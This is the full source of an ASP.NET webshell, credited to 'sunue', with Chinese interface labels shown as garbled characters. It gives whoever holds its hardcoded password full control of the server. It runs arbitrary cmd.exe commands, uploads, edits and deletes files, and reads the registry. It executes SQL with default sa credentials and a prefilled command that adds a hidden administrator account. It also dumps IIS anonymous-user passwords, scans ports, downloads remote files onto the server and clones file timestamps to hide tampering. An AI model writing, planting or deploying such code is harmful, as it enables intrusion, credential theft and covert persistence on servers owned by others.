<%@ Page Language="C#" ContentType="text/html" validateRequest="false" aspcompat="true"%>
<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Import Namespace="System.IO" %>
<%@ import namespace="System.Diagnostics" %>
<%@ Import Namespace="Microsoft.Win32" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ import Namespace="System.DirectoryServices"%>
<%@ Import Namespace="System.Diagnostics" %>
<%
//-------------------------------Code by sunue--------------------------------
//--------------------------------------------
%>

<script runat="server">

public string PWD ="xp1234"; //

string GetParentDir(string subdir)
{
string holepath = subdir;
char[] separator = { '\\' };
String[] patharray = new String[20];
patharray = holepath.Split(separator);
string parentdir="";
int arraynum=0;
for (arraynum = 0; arraynum < (patharray.Length-2);arraynum++ )
{
if (patharray[arraynum] != null)
{
parentdir += patharray[arraynum] + "\\";
}
}
//parentdir += patharray[patharray.Length - 2];
return parentdir;
}

string GetWebName()
{ 
string holepath = Request.CurrentExecutionFilePath;
char[] separator = { '/' };
String[] patharray = new String[20];
patharray = holepath.Split(separator);
return patharray[(patharray.Length-1)];
}

void listprocess()
{
Process[] process = Process.GetProcesses();
foreach (Process allprocess in process)
{
ListBoxPro.Items.Add(allprocess.ProcessName);
}
string ProcessNum = ListBoxPro.Items.Count.ToString();
LbNum.Text = ProcessNum + "��";
}
void DownFile(string src)
{
string pathfile = src; //pathfile Ҫ���ص��ļ�����
FileInfo file = new FileInfo(pathfile);
Response.Clear();
Response.AddHeader("Content-Disposition", "attachment; filename=" + HttpUtility.UrlEncode(file.Name));
Response.AddHeader("Content-Length", file.Length.ToString());
Response.ContentType = "application/octet-stream";
Response.WriteFile(file.FullName);
Response.End();
}

void GetDir(string Url,string file_name)
{
Response.Write("<table align =\"center\">");
Response.Write("<tr>");
Response.Write("<td>�ļ���</td>");
Response.Write("<td> </td>");
Response.Write("<td>��С</td>");
Response.Write("<td> </td>");
Response.Write("<td>�޸�ʱ��</td>");
Response.Write("<td> </td>");
Response.Write("<td>����</td>");
Response.Write("</tr>");

DirectoryInfo dir = new DirectoryInfo(Url);
if (dir == null)
return;
try
{
DirectoryInfo[] dirs = dir.GetDirectories();
Response.Write("<tr>");
Response.Write("<a href='?page=index&src=" +Server.UrlEncode(GetParentDir(file_name)));
Response.Write("'><font color='red'>/*����һ��Ŀ¼*/</a></font>");
Response.Write("\r\n");
Response.Write("</tr>");

foreach (DirectoryInfo file in dirs)
{
Response.Write("<tr>");
Response.Write("<td>");

Response.Write("<a href='?page=index&src="+Server.UrlEncode(file_name)+Server.UrlEncode(file.Name.ToString())+"\\'>"+file.Name.ToString()+"</a>");
Response.Write("</td>");
Response.Write("<td> </td>");
Response.Write("<td>");
Response.Write("<Ŀ¼>");
Response.Write("</td>");
Response.Write("<td> </td>");
Response.Write("<td>");
string time = File.GetCreationTime(file_name+file.Name.ToString()).ToString();
Response.Write(time);
Response.Write("</td>");
Response.Write("<td> </td>");
Response.Write("<td>");

Response.Write("<a href='?action=del&src=");
Response.Write(Server.UrlEncode(file_name) + "\\" + Server.UrlEncode(file.Name.ToString()));
Response.Write("'onClick='return del(this);'>Del</a>");
Response.Write("</td>");
Response.Write("</tr>");
}

FileInfo[] files = dir.GetFiles();
foreach (FileInfo filed in files)
{
Response.Write("<tr>");
Response.Write("<td>");
Response.Write(filed.Name.ToString());
Response.Write("</td>");
Response.Write("<td> </td>");
Response.Write("<td>");
string size = file_name + "\\" + filed.Name.ToString();
FileInfo info = new FileInfo(size);
Response.Write(info.Length.ToString() + "�ֽ�");
Response.Write("</td>");
Response.Write("<td> </td>");
Response.Write("<td>");
string time = File.GetCreationTime(file_name + "\\" + filed.Name.ToString()).ToString();
Response.Write(time);
Response.Write("</td>");
Response.Write("<td> </td>");
Response.Write("<td>");
Response.Write("<a href='?action=edit&src=");
Response.Write(Server.UrlEncode(file_name) + "\\" + Server.UrlEncode(filed.Name.ToString()));
Response.Write("'>Edit</a>");
Response.Write(" ");
Response.Write("<a href='?action=copy&src=");
Response.Write(Server.UrlEncode(file_name) + "\\" +Server.UrlEncode(filed.Name.ToString()));
Response.Write("'>Copy</a>");
Response.Write(" ");
Response.Write("<a href='?action=deldir&src=");
Response.Write(Server.UrlEncode(file_name) + "\\" + Server.UrlEncode(filed.Name.ToString()));
Response.Write("'onClick='return del(this);'>Del</a>");
Response.Write(" ");
Response.Write("<a href='?action=down&src=");
Response.Write(Server.UrlEncode(file_name) + "\\" +Server.UrlEncode(filed.Name.ToString()));
Response.Write("'onClick='return down(this);'>Down</a>");
Response.Write(" ");
Response.Write("<a href='?action=rename&src=");
Response.Write(Server.UrlEncode(file_name) + "\\" + Server.UrlEncode(filed.Name.ToString()));
Response.Write("'>Rename</a>");
Response.Write("</td>");
Response.Write("</tr>");
}
}
catch (Exception)
{
Response.Write("�����ڻ���ʱ��ܾ�!");
return;
}
Response.Write("</table>");

}

</script>
<% 
string page = Request.QueryString["page"];
string action = Request.QueryString["action"];
string src = Request.QueryString["src"];
%>

<script language="javascript">
function del()
{
if (confirm("���,��Ҫɾ��?�����!!")) { return true; }
else { return false; }
}
</script>
<script language="javascript">
function down()
{
if (confirm("��������ص��ļ�����20M\n���鲻Ҫ�ô˷�ʽ����\n����Խ����ļ������ļ���webĿ¼��,ʹ��HTTP����\n�㻹��ȷ���ô˷�ʽ������?")){ return true;}
else{ return false; }
}
</script>
<%
if (action == "del")
{
Directory.Delete(src,true);
string webname = GetWebName();
Response.Redirect(webname + "?page=index&src="+GetParentDir(src));////
}
if (action == "deldir")
{
FileInfo fl = new FileInfo(src);
fl.Delete();
string webname = GetWebName();
Response.Redirect(GetParentDir(webname + "?page=index&src=" + src));
}
%> 
<%

if (Session["root"] != null)
{

%>
<table align='center'>
<tr>
<td><font color="red">����:</font></td>
<td>
<%
Response.Write("<a href='?page=index&src=" + Server.MapPath(".") + "\\'><font color='#009900'>WebshellĿ¼</font></a>");
%>
</td>
<td><a href='?page=info'><font color="#009900">������Ϣ</font></a></td>
<td><a href='?page=process'><font color="#009900">���̹���</font></a></td>
<td><a href='?page=newfile'><font color="#009900">�½��ļ�</font></a></td>
<td><a href='?page=newdir'><font color="#009900">�½�Ŀ¼</font></a></td>
<td><a href='?page=upload'><font color="#009900">�ļ��ϴ�</font></a></td>
<td><a href='?page=reg'><font color="#009900">ע����ȡ</font></a></td>
<td><a href='?page=cmd'><font color="#009900">cmdִ��</font></a></td>
<td><a href='?page=sql'><font color="#009900">sqlִ��</font></a></td>
<td><a href='?page=scan'><font color="#009900">�˿�ɨ��</font></a></td>
<td><a href='?page=iis'><font color="#009900">iis��Ϣ</font></a></td>
<td><a href='?page=clonetime'><font color="#009900">��¡ʱ��</font></a></td>
<td><a href='?page=download'><font color="#009900">Զ���ļ�����</font></a></td>
<td><a href='?page=logout'><font color="#009900">�ǳ�</font></a></td>
</tr>
<tr>
<td colspan=14><hr></td>
</tr>
<table align ="center">
<tr>
<td><font color="red">��ȨĿ¼:</font> </td>
<td><a href='?page=index&src=C:\Program Files\'><font color="#009900">Program Files</font></a> </td>
<td><a href='?page=index&src=C:\Documents and Settings\All Users\Documents\'><font color="#009900">Documents</font></a> </td>
<td><a href='?page=index&src=C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\'><font color="#009900">PcAnywhere</font></a> </td>
<td><a href='?page=index&src=C:\Documents and Settings\All Users\����ʼ���˵�\����\'><font color="#009900">��ʼ�˵�</font></a> </td>
<td><a href='?page=index&src=C:\Documents and Settings\All Users\'><font color="#009900">All Users</font></a> </td>
<td><a href='?page=index&src=C:\Program Files\serv-u\'><font color="#009900">Serv-uĿ¼I</font></a> </td>
<td><a href='?page=index&src=C:\Program Files\RhinoSoft.com\'><font color="#009900">Serv-uĿ¼II</font></a> </td>
<td><a href='?page=index&src=C:\Program Files\Real\'><font color="#009900">Real</font></a> </td>
<td><a href='?page=index&src=C:\Program Files\Microsoft SQL Server\'><font color="#009900">Sql Server</font></a> </td>
<td><a href='?page=index&src=C:\WINDOWS\system32\config\'><font color="#009900">Config</font></a> </td>
<td><a href='?page=index&src=C:\WINDOWS\system32\inetsrv\data\'><font color="#009900">Data</font></a> </td>
<td><a href='?page=index&src=C:\windows\Temp\'><font color="#009900">Temp</font></a> </td>
</tr>
<tr>
<td colspan=13><hr></td>
</tr>
</table>
<table align ="center">
<tr>
<td>
<font color="red">�̷����:</font>
<% 
String[] drives = Environment.GetLogicalDrives();
for (int i = 0; i < drives.Length; i++)
{
Response.Write("<a href ='"+ GetWebName() +"?page=index&src="+drives[i]+"'>"+ drives[i]+"</a>" + "&nbsp&nbsp&nbsp&nbsp");
}

%>
</td>
</tr>
</table> 

<table align = "center">

<font color = "red"> ��ǰ·��:</font>
<font color = "#009900"> 
<%
if (src == null)
{
Response.Write(Server.MapPath(".")+"\\");
}
else
Response.Write(src);

%>
</font>
</table>
<hr>
<%

if ((page == "info") && (Session["root"] != null))
{
this.LbServerNameC.Text = Server.MachineName;
this.LbLangC.Text = Request.UserLanguages[0];
this.LbIpC.Text = Request.UserHostAddress;
this.LbBrowerC.Text = Request.UserAgent;
this.LbDnsC.Text = Request.UserHostName;
this.LbUrlC.Text = Server.MapPath(".");
this.LbUrlXdC.Text = Request.Path;
this.LbTimeC.Text = DateTime.Now.ToString();
this.Lbversionc.Text = Environment.Version.ToString();
this.LbUserc.Text = Environment.UserName;
this.LbBBC.Text = Environment.OSVersion.ToString();
%> 
<table align='center'> 
<tr>
<td colspan="10">
<asp:Label ID="LbServerName" runat="server" Text="�������:" ForeColor="Red"></asp:Label>
<asp:Label ID="LbServerNameC" runat="server" BorderStyle="None"></asp:Label></br>
<asp:Label ID="LbLang" runat="server" Text="���������:" ForeColor="Red"></asp:Label>
<asp:Label ID="LbLangC" runat="server"></asp:Label></br>
<asp:Label ID="LbIp" runat="server" Text="�����IP:" ForeColor="Red"></asp:Label>
<asp:Label ID="LbIpC" runat="server"></asp:Label></br>
<asp:Label ID="LbUser" runat="server" Text="��ǰ�û�:" ForeColor="Red"></asp:Label>
<asp:Label ID="LbUserc" runat="server"></asp:Label></br>
<asp:Label ID="LbBB" runat="server" Text="�������汾:" ForeColor="Red"></asp:Label>
<asp:Label ID="LbBBC" runat="server"></asp:Label></br>
<asp:Label ID="LbDns" runat="server" Text="DNS:" ForeColor="Red"></asp:Label>
<asp:Label ID="LbDnsC" runat="server"></asp:Label></br>
<asp:Label ID="LbTime" runat="server" Text="�����ʱ��:" ForeColor="Red"></asp:Label>
<asp:Label ID="LbTimeC" runat="server"></asp:Label></br>
<asp:Label ID="LbBrower" runat="server" Text="�������Ϣ:" ForeColor="Red"></asp:Label>
<asp:Label ID="LbBrowerC" runat="server"></asp:Label></br>
<asp:Label ID="LbUrl" runat="server" Text="���ļ����ھ���·��:" ForeColor="Red"></asp:Label>
<asp:Label ID="LbUrlC" runat="server"></asp:Label></br>
<asp:Label ID="LbUrlXd" runat="server" Text="���ļ��������·��:" ForeColor="Red"></asp:Label>
<asp:Label ID="LbUrlXdC" runat="server"></asp:Label></br>
<asp:Label ID="Lbversion" runat="server" Text=".NET�汾:" ForeColor="Red"></asp:Label>
<asp:Label ID="Lbversionc" runat="server"></asp:Label></br>

</td>
</tr>
</table>

<%
}
else if ((page == "reg") && (Session["root"] != null))
{
%> 
<table align='center'>
<form id="Form2" runat="server">
<asp:Label ID="LbRegUrlA" runat="server" Text="������Ҫ��ȡ�ļ�ֵע���·��:"></asp:Label>
<asp:Label ID="LbRegC" runat="server" Text="�����"></asp:Label><br />
<asp:TextBox ID="TextBoxReg" runat="server" Width="551px">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\Wds\rdpwd\Tds\tcp</asp:TextBox>
<asp:TextBox ID="TextBoxB" runat="server" Width="76px">PortNumber</asp:TextBox></br>
<asp:Button ID="ButtonReg" runat="server" OnClick="ButtonReg_Click" Text="Regedit" />
<asp:Label ID="Label1" runat="server" Text="����ȡ��ֵΪ:"></asp:Label>
<asp:Label ID="LbReg" runat="server" Width="319px"></asp:Label>
</form>
</table>

<script runat="server">

protected void ButtonReg_Click(object sender, EventArgs e)
{
try
{

string regvalue = TextBoxReg.Text;
string val = TextBoxB.Text;
string vals = "��ֵ������Ŷ";

char[] separator = { '\\' };
String[] patharray = new String[80];
patharray = regvalue.Split(separator);

string lastvalue="";

for (int i = 1; i < patharray.Length; i++)
{
lastvalue = lastvalue + patharray[i] + "\\";
}

switch(patharray[0])
{
case "HKEY_LOCAL_MACHINE":
RegistryKey reg = Registry.LocalMachine.OpenSubKey(lastvalue);
LbReg.Text = reg.GetValue(val, "null").ToString();
break;
case "HKEY_CLASSES_ROOT":
RegistryKey rega = Registry.ClassesRoot.OpenSubKey(lastvalue);
LbReg.Text = rega.GetValue(val, "null").ToString();
break;
case "HKEY_CURRENT_USER":
RegistryKey regb = Registry.CurrentUser.OpenSubKey(lastvalue);
LbReg.Text = regb.GetValue(val, "null").ToString();
break;
case "HKEY_USERS":
RegistryKey regc = Registry.Users.OpenSubKey(lastvalue);
LbReg.Text = regc.GetValue(val, "null").ToString();
break;
case "HKEY_CURRENT_CONFIG":
RegistryKey regd = Registry.CurrentConfig.OpenSubKey(lastvalue);
LbReg.Text = regd.GetValue(val, "null").ToString();
break;
default:
LbReg.Text = val;
break;

}


}
catch (Exception)
{
Response.Write("������ʲô�ط��������?����ע��������?");
}
}

</script>

<%
}
else if ((page == "upload") && (Session["root"] != null))
{
%>

<table align="center">
<form id="Form1" method="post" encType="multipart/form-data" runat="server">
����·��:<asp:TextBox ID="TextBoxSaveUpUrl" runat="server" Width="417px"></asp:TextBox><br />
<input name="upfile" type="file" class="TextBox" id="UpFile" runat="server" style="width: 447px">
<asp:Button ID="ButtonFuckUp" runat="server" OnClick="ButtonFuckUp_Click" Text="�ϴ�" Width="57px" /><br />
</form>
</table>
<script runat="server">
protected void ButtonFuckUp_Click(object sender, EventArgs e)
{
string upload = TextBoxSaveUpUrl.Text;
UpFile.PostedFile.SaveAs(upload);
}

</script>

<%
}
else if ((page == "cmd") && (Session["root"] != null))
{
%>
<table align='center'>
<form id="Form3" runat="server">
<asp:Label ID="LbDos" runat="server" Text="DOS����:"></asp:Label>
<asp:TextBox ID="TextBoxDos" runat="server" Width="499px">net user</asp:TextBox>
<asp:Button ID="ButtonDos" runat="server" OnClick="ButtonCmd_Click" Text="CMD" /></br>
<asp:TextBox ID="TextBoxDosC" runat="server" Height="300px" Width="570px" BorderStyle="Dotted" TextMode="MultiLine"></asp:TextBox>
</form>
</table>
<script runat="server">
protected void ButtonCmd_Click(object sender, EventArgs e)
{
TextBoxDosC.Text = "";
Process myprocess = new Process();
ProcessStartInfo MyProcessStartInfo = new ProcessStartInfo("cmd.exe");
MyProcessStartInfo.UseShellExecute = false;
MyProcessStartInfo.RedirectStandardOutput = true;
myprocess.StartInfo = MyProcessStartInfo;
MyProcessStartInfo.Arguments = "/c" + TextBoxDos.Text;
myprocess.Start();
StreamReader mystream = myprocess.StandardOutput;
TextBoxDosC.Text = mystream.ReadToEnd();
mystream.Close();
}
</script>

<% 
}
else if ((page == "sql") && (Session["root"] != null))
{
%>
<table align='center'>
<form id="Form4" runat="server">
<asp:Label ID="LbSqlA" runat="server" Text="Sql Host:"></asp:Label>
<asp:TextBox ID="TextBoxSqlA" runat="server" Width="410px">.</asp:TextBox></br>
<asp:Label ID="LbSqlB" runat="server" Text="Sql UserName:"></asp:Label>
<asp:TextBox ID="TextBoxSqlB" runat="server" >sa</asp:TextBox>
<asp:Label ID="LbSqlC" runat="server" Text="Sql Pwd:"></asp:Label>
<asp:TextBox ID="TextBoxSqlC" runat="server">sa</asp:TextBox>
<asp:Button ID="ButtonSqlCon" runat="server" Text="����" Width="51px" OnClick="ButtonSqlCon_Click" /></br>
<asp:Label ID="LbSqlD" runat="server" Text="Command:" Width="42px"></asp:Label>
<asp:TextBox ID="TextBoxSqlCon" runat="server" Width="400px" >net user char char /add & net localgroup administrators char /add</asp:TextBox>
<asp:Button ID="ButtonSqlCmd" runat="server" Text="ִ��" Width="52px" OnClick="ButtonSqlCmd_Click" /></br>
<asp:TextBox ID="TextBoxSqlCmd" runat="server" Height="106px" Width="470px"></asp:TextBox>
</form>
</table>
<script runat="server">
protected void ButtonSqlCon_Click(object sender, EventArgs e)
{
try
{
SqlConnection mycon = new SqlConnection();
mycon.ConnectionString = "Persist Security Info = False;User id =" + TextBoxSqlB.Text + ";pwd=" + TextBoxSqlC.Text + ";server=" + TextBoxSqlA.Text;
mycon.Open();
mycon.Close();
Response.Write("��ϲ��,���Ӳ��Գɹ�!");
}
catch (Exception)
{
Response.Write("�����˻�����,���Ӳ���ʧ��!");
}
}

protected void ButtonSqlCmd_Click(object sender, EventArgs e)
{
try
{
SqlConnection mycon = new SqlConnection();
mycon.ConnectionString = "Persist Security Info = False;User id =" + TextBoxSqlB.Text + ";pwd=" + TextBoxSqlC.Text + ";server=" + TextBoxSqlA.Text;
mycon.Open();
SqlCommand cmd = new SqlCommand();
cmd.Connection = mycon;
cmd.CommandText = TextBoxSqlCon.Text;
cmd.ExecuteNonQuery();

TextBoxSqlCmd.Text = "����ɹ�ִ��!";
mycon.Close();
}
catch (Exception)
{
TextBoxSqlCmd.Text = "����ִ��ʧ��!";
}

}

</script>
<%
}
else if (page == "iis" && Session["root"] != null)
{
%>
<div runat="server" id="VNR" >
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<asp:Table ID="GlI" runat="server" Width="100%" CellSpacing="0">
<asp:TableRow CssClass="head"><asp:TableCell>ID</asp:TableCell><asp:TableCell>IIS_USER</asp:TableCell><asp:TableCell>IIS_PASS</asp:TableCell><asp:TableCell>Domain</asp:TableCell><asp:TableCell>Path</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<script runat="server">
private bool SGde(string sSrc)
{
    Regex reg = new Regex(@"^0|[0-9]*[1-9][0-9]*$");
    if (reg.IsMatch(sSrc))
    {
        return true;
    }
    else
    {
        return false;
    }
}
public string MVVJ(string instr)
{
    byte[] tmp = Encoding.Default.GetBytes(instr);
    return Convert.ToBase64String(tmp);
}
public void AdCx()
{
    string qcKu = string.Empty;
    string mWGEm = "IIS://localhost/W3SVC";
    GlI.Style.Add("word-break", "break-all");
    try
    {
        DirectoryEntry HHzcY = new DirectoryEntry(mWGEm);
        int fmW = 0;
        foreach (DirectoryEntry child in HHzcY.Children)
        {
            if (SGde(child.Name.ToString()))
            {
                fmW++;
                DirectoryEntry newdir = new DirectoryEntry(mWGEm + "/" + child.Name.ToString());
                DirectoryEntry HlyU = newdir.Children.Find("root", "IIsWebVirtualDir");
                //string bg = OKM();
                TableRow TR = new TableRow();
                //TR.Attributes["onmouseover"] = "this.className='focus';";
                //TR.CssClass = bg;
                //TR.Attributes["onmouseout"] = "this.className='" + bg + "';";
                TR.Attributes["title"] = "Site:" + child.Properties["ServerComment"].Value.ToString();
                for (int i = 1; i < 6; i++)
                {
                    try
                    {
                        TableCell tfit = new TableCell();
                        switch (i)
                        {
                            case 1:
                                tfit.Text = fmW.ToString();
                                break;
                            case 2:
                                tfit.Text = HlyU.Properties["AnonymousUserName"].Value.ToString();
                                break;
                            case 3:
                                tfit.Text = HlyU.Properties["AnonymousUserPass"].Value.ToString();
                                break;
                            case 4:
                                StringBuilder sb = new StringBuilder();
                                PropertyValueCollection pc = child.Properties["ServerBindings"];
                                for (int j = 0; j < pc.Count; j++)
                                {
                                    sb.Append(pc[j].ToString() + "<br>");
                                }
                                tfit.Text = sb.ToString().Substring(0, sb.ToString().Length - 4);
                                break;
                            case 5:
                                tfit.Text = "<a href=\"javascript:Bin_PostBack('Bin_Listdir','" + MVVJ(HlyU.Properties["Path"].Value.ToString()) + "')\">" + HlyU.Properties["Path"].Value.ToString() + "</a>";
                                break;
                        }
                        TR.Cells.Add(tfit);
                    }
                    catch (Exception ex)
                    {
                        Response.Write(ex.Message);
                        continue;
                    }
                }
                GlI.Controls.Add(TR);
            }
        }
    }
    catch (Exception ex)
    {
        Response.Write(ex.Message);
    }
}
    </script>
<% AdCx();
}
else if ((page == "scan") && (Session["root"] != null))
{
%>
<table align='center'>
<form id="Form5" runat="server">
IP:<asp:TextBox ID="TextBoxScanIP" runat="server" Width="238px">127.0.0.1</asp:TextBox>
port(��˿����ö��Ÿ���)<asp:TextBox ID="TextBoxScanPort" runat="server" Width="238px">21,1433,3389</asp:TextBox>
<asp:Button ID="ButtonScan" runat="server" OnClick="ButtonScan_Click" Text="ɨ��" Width="51px" /><br />
<asp:Label ID="LbScan" runat="server" Width="666px"></asp:Label>
</form>
</table>
<script runat="server">
protected void ButtonScan_Click(object sender, EventArgs e)
{
LbScan.Text = "";
TcpClient client = new TcpClient();
string allport = TextBoxScanPort.Text;
char[] separator = { ',' };
String[] portarray = new String[20];
portarray = allport.Split(separator);
int portnum = 0;
while (portnum < portarray.Length)
{
IPAddress address = IPAddress.Parse(TextBoxScanIP.Text);
int i = int.Parse(portarray[portnum]);
try
{
client.Connect(address, i);
LbScan.Text +="<font color='red'>"+i.ToString()+"<font>�˿��ӾͿ�����!</br>";
client.Close();
}
catch (SocketException)
{
LbScan.Text += i + "�˿���û����!<br>";
}
portnum++;
}
client.Close();
}
</script>

<%
}

%>

<%
else if (page == "logout")
{
Session["root"] = null;
Response.Redirect(GetWebName());
%>

<%
}
else if ((page == "clonetime") && (Session["root"] != null))
{ 

%> <table align='center'>
<form id="Form6" runat="server">
Ҫ��¡���ļ�:<asp:TextBox ID="TextBoxWant" runat="server" Width="270px"></asp:TextBox></br>
����¡���ļ�:<asp:TextBox ID="TextBoxTo" runat="server" Width="270px"></asp:TextBox>
<asp:Button ID="Button_Clone" runat="server" OnClick="ButtonClone_Click" Text="��¡" Width="48px" />
</form>
<table>

<script runat="server">
protected void ButtonClone_Click(object sender, EventArgs e)
{
FileInfo filewant = new FileInfo(TextBoxWant.Text.ToString());
FileInfo filego = new FileInfo(TextBoxTo.Text.ToString());
filewant.LastWriteTime = filego.LastWriteTime;
filewant.LastAccessTime = filego.LastAccessTime;
filewant.CreationTime = filego.CreationTime;
Response.Write("Clone time success!");
}
</script>
<%
}
else if ((page == "download") && (Session["root"] != null))
{
%>
<table align='center'>
<form id="Form7" runat="server">
���ص�ַ:<asp:TextBox ID="TextBoxDurl" runat="server" Width="270px">http://www.baidu.com/img/logo.gif</asp:TextBox></br>
����·��:<asp:TextBox ID="TextBoxDfile" runat="server" Width="270px">c:\logo.gif</asp:TextBox>
<asp:Button ID="ButtonDown" runat="server" OnClick="ButtonDown_Click" Text="����" />
</form>
</table>
<script runat="server">
protected void ButtonDown_Click(object sender, EventArgs e)
{
string url = TextBoxDurl.Text.ToString();
string file = TextBoxDfile.Text.ToString();
WebClient wc = new WebClient();
Stream str = wc.OpenRead(url);
byte[] bytes = new byte[1024];
int len = 0;
FileStream fs = new FileStream(file, FileMode.OpenOrCreate, FileAccess.Write);
while ((len = str.Read(bytes, 0, 1024)) != 0)
{
fs.Write(bytes, 0, len);
}
fs.Close();
}
</script>
<%
}
else if ((page == "newdir") && (Session["root"] != null))
{ 
%>
<table align='center'>
<form id="Form8" runat="server">
����·�����ļ�������:<asp:TextBox ID="TextBoxNewDir" runat="server" Width="368px"></asp:TextBox>
<asp:Button ID="ButtonNewDir" runat="server" OnClick="ButtonNewDir_Click" Text="����Ŀ¼" /><br />
</form>
</table>
<script runat="server">
protected void ButtonNewDir_Click(object sender, EventArgs e)
{
Directory.CreateDirectory(TextBoxNewDir.Text.ToString());
Response.Write("Ŀ¼�����ɹ�!");
}
</script>
<% 
}
else if ((page == "index") && Session["root"] != null)
{
%>

<%
if (src == "")
{
Response.Write("<font color='red'>���Ѿ��޷������ϲ�Ŀ¼��,��������,лл!</font>");
}
else
GetDir(src, src);
%>

<%
}
else if ((page == "process") && Session["root"] != null)
{
ListBoxPro.Items.Clear();
listprocess();
%>
<form id="Form11" runat="server">
<table align = "center">

<tr>
<td><font color ="red">�ɴ�����ִ��ָ��������(Ȩ������):</font><br>
<font color ="red">ִ�г���(����·��):</font><asp:TextBox ID="TextBoxExe" runat="server" Width="200px"></asp:TextBox><br>
<font color ="red">����(����,�ɲ�д):</font>
<asp:TextBox ID="TextBoxExeC" runat="server" Width="208px"></asp:TextBox>
<asp:Button ID="ButtonExe" runat="server" OnClick="ButtonExe_Click" Text="ִ��" Width="44px" />
<div id="tnQRF" runat="server" visible="false" enableviewstate="false"></div>
<td>
</tr>
</table>

<table align="center">
<tr>
<font color="red"> ��ǰ����:</font>
<td>


<asp:ListBox ID="ListBoxPro" runat="server" Height="300px" Width="300px"></asp:ListBox><br />
�ܽ�����:<asp:Label ID="LbNum" runat="server"></asp:Label><br />
<asp:Button ID="ButtonProDel" runat="server" OnClick="ButtonProDel_Click" Text="ѡ�С�ɾ��" Width="70px" />

<asp:Button ID="ButtonProClear" runat="server" OnClick="ButtonProClear_Click" Text="ˢ��" Width="51px" />
</form>
</td>
</tr>
</table>
<script runat="server">
protected void ButtonExe_Click(object sender, EventArgs e)
{
Process exe = new Process();
exe.StartInfo.FileName = TextBoxExe.Text.ToString();
exe.StartInfo.Arguments = TextBoxExeC.Text.ToString();
exe.StartInfo.UseShellExecute = false;
exe.StartInfo.RedirectStandardInput = true;
exe.StartInfo.RedirectStandardOutput = true;
exe.StartInfo.RedirectStandardError = true;
exe.Start();
string Uoc=exe.StandardOutput.ReadToEnd();
Uoc=Uoc.Replace("<","&lt;");
Uoc=Uoc.Replace(">","&gt;");
Uoc=Uoc.Replace("\r\n","<br>");
tnQRF.Visible=true;
tnQRF.InnerHtml="<hr width=\"100%\" noshade/><pre>"+Uoc+"</pre>";
}

protected void ButtonProDel_Click(object sender, EventArgs e)
{

Process[] killprocess = Process.GetProcesses();
try
{
foreach (Process kill in killprocess)
{
string processname = ListBoxPro.SelectedValue.ToString();
if (processname == kill.ProcessName)
kill.Kill();
}
Response.Write("ɾ���ɹ�,��ˢ��֮!������ɹ�,���ˢ�¼�������!");
}
catch (Exception wrong)
{
Response.Write("ϵͳ����:" + wrong+"<br>");
Response.Write("<font color ='red'>�����ϵͳ������ʾ,����ˢ��һ���ٳ���ɾ��!!!</font>");
}

}
protected void ButtonProClear_Click(object sender, EventArgs e)
{
ListBoxPro.Items.Clear();
listprocess();
}
</script>

<%
}
else if ((page == "newfile") && (Session["root"] != null))
{
%>
<table align ="center">
<form runat="server">
<asp:TextBox ID="TextBoxNewfile" runat="server" Width="477px" ForeColor="#009900" >c:\char.txt</asp:TextBox>
<asp:Button ID="ButtonNewfile" runat="server" OnClick="ButtonNewfile_Click" Text="����" Width="57px" /><br />
<br />
<asp:TextBox ID="TextBoxNewfiles" runat="server" Height="324px" ForeColor="#009900" TextMode="MultiLine" Width="537px" ></asp:TextBox><br />
</form>
</table>

<script runat="server">
protected void ButtonNewfile_Click(object sender, EventArgs e)
{
StreamWriter sw = new StreamWriter(TextBoxNewfile.Text.ToString(),false,Encoding.Default);
sw.Write(TextBoxNewfiles.Text.ToString());
sw.Close();
}
</script>
<% 
}
else if ((action == "edit") && (Session["root"] != null))
{
%>
<%
TextBoxReadDir.Text = src;

StreamReader sr = new StreamReader(TextBoxReadDir.Text.ToString(), Encoding.Default);
TextBoxFileContent.Text = sr.ReadToEnd();
sr.Close();
%>
<table align='center'>
<form runat="server">
<asp:TextBox ID="TextBoxReadDir" runat="server" Width="477px" ForeColor="#009900" ></asp:TextBox>
<asp:Button ID="ButtonSave" runat="server" OnClick="ButtonSave_Click" Text="����" Width="57px" /><br />
<br />
<asp:TextBox ID="TextBoxFileContent" runat="server" Height="324px" TextMode="MultiLine" Width="537px" ></asp:TextBox><br />
<br />
</form>
<table>

<script runat="server">
protected void ButtonSave_Click(object sender, EventArgs e)
{
StreamWriter sw = new StreamWriter(TextBoxReadDir.Text.ToString(),false,Encoding.Default);
sw.Write(TextBoxFileContent.Text.ToString());
sw.Close();
}
</script>

<%
}
else if (action == "rename" && Session["root"] != null)
{
TextBoxRename.Text = src;
TextBoxRenameTo.Text = src;
%>
<table align ="center">
<form runat="server">
������:<asp:TextBox ID="TextBoxRename" runat="server" Width="495px"></asp:TextBox><br />
Ϊ: 
<asp:TextBox ID="TextBoxRenameTo" runat="server" Width="495px"></asp:TextBox>
<asp:Button ID="ButtonRename" runat="server" OnClick="ButtonRename_Click" Text="������" /><br />
</form>
<table>
<script runat="server">
protected void ButtonRename_Click(object sender, EventArgs e)
{
File.Move(TextBoxRename.Text.ToString(),TextBoxRenameTo.Text.ToString());
TextBoxRenameTo.Text = "";
}
</script>
<%
}

if (action == "copy" && (Session["root"] != null))
{
TextBoxCopy.Text = src;
%>
<form id="Form9" runat="server">
<table align="center">
��:<asp:TextBox ID="TextBoxCopy" runat="server" Width="469px"></asp:TextBox><br />
��:<asp:TextBox ID="TextBoxCopyTo" runat="server" Width="468px"></asp:TextBox> 
<asp:Button ID="ButtonCopy" runat="server" OnClick="ButtonCopy_Click" Text=" ����" />
</table>
</form>
<script runat="server">
protected void ButtonCopy_Click(object sender, EventArgs e)
{
string old = TextBoxCopy.Text;
string news = TextBoxCopyTo.Text;
File.Copy(old, news, true);

}
</script>
<%
}

else if (action == "down" && (Session["root"] != null))
{
DownFile(src);

%>


<html>
<head id="Head1" runat="server">
<title></title>
<script runat="server">
public ArrayList al = new ArrayList();

protected void Page_Load(object sender, EventArgs e)
{
Response.Write("<title>���ۿƼ�ר��AspX���� By:sunue</title>");

}
</script>

</head>
<body>

</body>
</html>
